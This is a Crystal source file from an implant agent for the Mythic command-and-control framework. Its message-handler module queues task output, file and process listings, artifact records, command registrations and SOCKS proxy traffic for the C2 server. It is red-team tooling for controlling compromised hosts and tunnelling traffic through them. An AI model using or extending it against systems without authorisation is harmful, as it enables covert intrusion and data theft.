require "json"
require "./config"

module Dark::Agent
  # MessageHandler manages task responses and command registration
  # for communication with the Mythic C2 server.
  #
  # This module provides a queue-based approach to collecting task responses
  # and command registrations, which are later combined into a single agent message
  # when sent to the Mythic C2 server.
  #
  # Example usage:
  # ```
  # # Queue different types of task responses
  # MessageHandler.add_response("task-uuid", :success, "Command executed successfully")
  # MessageHandler.add_response("task-uuid", :error, "Command failed")
  # MessageHandler.add_response("task-uuid", :info, "Processing...")
  # MessageHandler.add_response("task-uuid", :file_browser, file_browser_data: data)
  # MessageHandler.add_response("task-uuid", :process_browser, processes: proc_data)
  # MessageHandler.add_response("task-uuid", :artifact, base_artifact: "File Read", artifact: "/path/file")
  #
  # # Register a new command
  # MessageHandler.add_command("my_command")
  #
  # # Remove a command
  # MessageHandler.remove_command("my_command")
  #
  # # Add SOCKS proxy data
  # MessageHandler.add_socks_data(server_id, base64_data, exit_flag)
  #
  # # Check if there are any responses to send
  # if MessageHandler.has_responses?
  #   message = MessageHandler.prepare_response
  #   # Send message to C2 server
  # end
  # ```

  # Response types for task responses
  enum ResponseType
    Success
    Error
    Info
    FileBrowser
    ProcessBrowser
    Artifact
    Socks
  end

  module MessageHandler
    # Using Hash with JSON::Any for maximum flexibility with mixed types
    # Queues for responses and commands
    @@responses = [] of Hash(String, JSON::Any)
    @@commands = [] of Hash(String, JSON::Any)

    # Configuration instance
    @@config : Config::Base? = nil

    # Set the configuration instance
    def self.set_config(config : Config::Base)
      @@config = config
    end

    # Mutex for thread-safe operations
    @@mutex = Mutex.new


    # =========================================================
    # Task Response Methods
    # =========================================================

    # Unified method to add any type of task response
    def self.add_response(task_id : String, response_type : ResponseType, data : String? = nil,
                          file_browser_data : Hash(String, JSON::Any)? = nil,
                          processes : JSON::Any? = nil,
                          user_output : String? = nil,
                          base_artifact : String? = nil,
                          artifact : String? = nil,
                          needs_cleanup : Bool = false,
                          resolved : Bool = false,
                          callback : Hash(String, JSON::Any)? = nil,
                          socks_server_id : Int32? = nil,
                          socks_exit_flag : Bool = false,
                          socks_data : String? = nil)
      # Base response structure
      response = {
        "task_id" => JSON::Any.new(task_id)
      } of String => JSON::Any

      # Configure response based on type
      case response_type
      when .success?
        response["user_output"] = JSON::Any.new(data || "")
        response["completed"] = JSON::Any.new(true)
        response["status"] = JSON::Any.new("success")

        # Add callback key if provided
        response["callback"] = JSON::Any.new(callback) if callback
        log_debug("Added success response for task #{task_id}")

      when .error?
        response["user_output"] = JSON::Any.new(data || "")
        response["completed"] = JSON::Any.new(true)
        response["status"] = JSON::Any.new("error: An exception occurred")
        log_debug("Added error response for task #{task_id}")

      when .info?
        response["user_output"] = JSON::Any.new(data || "")
        response["completed"] = JSON::Any.new(false)
        response["status"] = JSON::Any.new("processing")
        log_debug("Added info message for task #{task_id}")

      when .file_browser?
        if file_browser_data
          response["file_browser"] = JSON::Any.new(file_browser_data)
          response["completed"] = JSON::Any.new(true)
          response["status"] = JSON::Any.new("success")
          # Add optional user output if provided
          if user_output
            response["user_output"] = JSON::Any.new(user_output)
          end
          log_debug("Added file browser response for task #{task_id}")
        else
          raise "file_browser_data is required for FileBrowser response type"
        end

      when .process_browser?
        if processes
          response["processes"] = processes
          response["completed"] = JSON::Any.new(true)
          response["status"] = JSON::Any.new("success")
          response["user_output"] = JSON::Any.new({"processes" => processes}.to_json)
          log_debug("Added process browser response for task #{task_id}")
        else
          raise "processes is required for ProcessBrowser response type"
        end

      when .artifact?
        if base_artifact && artifact
          # Check for existing response for this task (artifact logic)
          existing_index = @@responses.index do |resp|
            resp["task_id"]? && resp["task_id"].as_s == task_id
          end

          if existing_index
            # Add artifact to existing response
            existing_response = @@responses[existing_index]

            # Create artifacts array if it doesn't exist
            if !existing_response["artifacts"]?
              existing_response["artifacts"] = JSON::Any.new([] of JSON::Any)
            end

            # Add new artifact entry
            artifacts = existing_response["artifacts"].as_a
            new_artifact = {
              "base_artifact" => JSON::Any.new(base_artifact),
              "artifact" => JSON::Any.new(artifact),
              "needs_cleanup" => JSON::Any.new(needs_cleanup),
              "resolved" => JSON::Any.new(resolved)
            }
            artifacts << JSON::Any.new(new_artifact)

            # Update response
            existing_response["artifacts"] = JSON::Any.new(artifacts)
            @@responses[existing_index] = existing_response
            log_debug("Added artifact tracking to existing response: #{base_artifact} - #{artifact}")
            return  # Early return for existing response case
          else
            # Create a new response with artifact
            response["artifacts"] = JSON::Any.new([
              JSON::Any.new({
                "base_artifact" => JSON::Any.new(base_artifact),
                "artifact" => JSON::Any.new(artifact),
                "needs_cleanup" => JSON::Any.new(needs_cleanup),
                "resolved" => JSON::Any.new(resolved)
              })
            ])
            log_debug("Added artifact tracking: #{base_artifact} - #{artifact}")
          end
        else
          raise "base_artifact and artifact are required for Artifact response type"
        end

      when .socks?
        if socks_server_id && socks_data
          response["socks"] = JSON::Any.new({
            "server_id" => JSON::Any.new(socks_server_id),
            "data" => JSON::Any.new(socks_data),
            "exit" => JSON::Any.new(socks_exit_flag)
          })
          log_debug("Added SOCKS response for server_id=#{socks_server_id}, exit=#{socks_exit_flag}")
        else
          raise "socks_server_id and socks_data are required for Socks response type"
        end
      end

      @@responses << response
    end


    # =========================================================
    # Command Registration Methods
    # =========================================================

    # Add a command to the commands queue
    def self.add_command(command_name : String)
      command = {"action" => JSON::Any.new("add"), "cmd" => JSON::Any.new(command_name)}
      @@commands << command
      log_debug("Added command to queue: #{command_name}")
    end

    # Remove a command from the commands queue
    def self.remove_command(command_name : String)
      command = {"action" => JSON::Any.new("remove"), "cmd" => JSON::Any.new(command_name)}
      @@commands << command
      log_debug("Added command removal to queue: #{command_name}")
    end

    # =========================================================
    # SOCKS Proxy Methods
    # =========================================================

    # Simplified SOCKS proxy data handling using unified response system
    def self.add_socks_data(server_id : Int32, data : String, exit : Bool = false)
      # Use the unified response system with a dummy task_id for SOCKS messages
      add_response("socks-#{server_id}", :socks, socks_server_id: server_id, socks_data: data, socks_exit_flag: exit)
    end


    # =========================================================
    # Message Generation Methods
    # =========================================================

    # Prepare the combined agent message for sending to Mythic C2
    def self.prepare_response
      # Final responses array (without SOCKS data)
      task_responses = [] of Hash(String, JSON::Any)
      # Collect all SOCKS messages
      socks_messages = [] of JSON::Any

      # Get all responses and commands in one atomic operation
      current_responses = [] of Hash(String, JSON::Any)
      current_commands = [] of Hash(String, JSON::Any)

      @@mutex.synchronize do
        if !@@responses.empty?
          current_responses = @@responses
          @@responses = [] of Hash(String, JSON::Any)
        end

        if !@@commands.empty?
          current_commands = @@commands
          @@commands = [] of Hash(String, JSON::Any)
        end
      end

      # Process each response and separate SOCKS from regular responses
      current_responses.each do |response|
        if response["socks"]?
          # It's a SOCKS message, add to socks array
          socks_data = response["socks"]
          if socks_data.as_h?
            socks_messages << JSON::Any.new(socks_data.as_h)
          end
        else
          # Regular task response
          task_responses << response
        end
      end

      # Add commands to each regular response if we have any
      if !current_commands.empty?
        task_responses.each do |response|
          response["commands"] = JSON::Any.new(current_commands.map { |c| JSON::Any.new(c) })
        end
      end

      # Create the final message with proper structure
      message = {
        "action"    => JSON::Any.new("post_response"),
        "responses" => JSON::Any.new(task_responses.map { |r| JSON::Any.new(r) })
      }

      # Add SOCKS array if we have any SOCKS messages
      if !socks_messages.empty?
        message["socks"] = JSON::Any.new(socks_messages)

        # Log ALL SOCKS messages regardless of count
        log_debug("🔄 MessageHandler: prepare_response: Added #{socks_messages.size} SOCKS messages")

        # Log each SOCKS message
        socks_messages.each_with_index do |msg, idx|
          if msg.as_h["exit"]?.try(&.as_bool) || false
            log_debug("🔄 MessageHandler: SOCKS message #{idx}: server_id=#{msg.as_h["server_id"].as_i}, EXIT")
          else
            data_size = msg.as_h["data"]?.try(&.as_s.size) || 0
            log_debug("🔄 MessageHandler: SOCKS message #{idx}: server_id=#{msg.as_h["server_id"].as_i}, data_size=#{data_size}")
          end
        end
      end

      # Only log detailed information if significant activity
      resp_count = task_responses.size
      socks_count = socks_messages.size
      cmd_count = current_commands.size

      if resp_count > 0 || socks_count > 5 || cmd_count > 0
        log_warn("Prepared agent message with #{resp_count} responses, #{socks_count} SOCKS messages, and #{cmd_count} commands")
      end

      message
    end

    # =========================================================
    # Utility Methods
    # =========================================================

    # Check if there are any pending responses or commands
    def self.has_responses? : Bool
      @@mutex.synchronize do
        !@@responses.empty? || !@@commands.empty?
      end
    end

    # Check if there are any SOCKS messages in the responses
    def self.has_socks_traffic? : Bool
      @@mutex.synchronize do
        @@responses.any? { |response| response["socks"]? }
      end
    end

    # Get total count of pending items for logging
    def self.total_count : Int32
      @@mutex.synchronize do
        @@responses.size + @@commands.size
      end
    end
  end
end
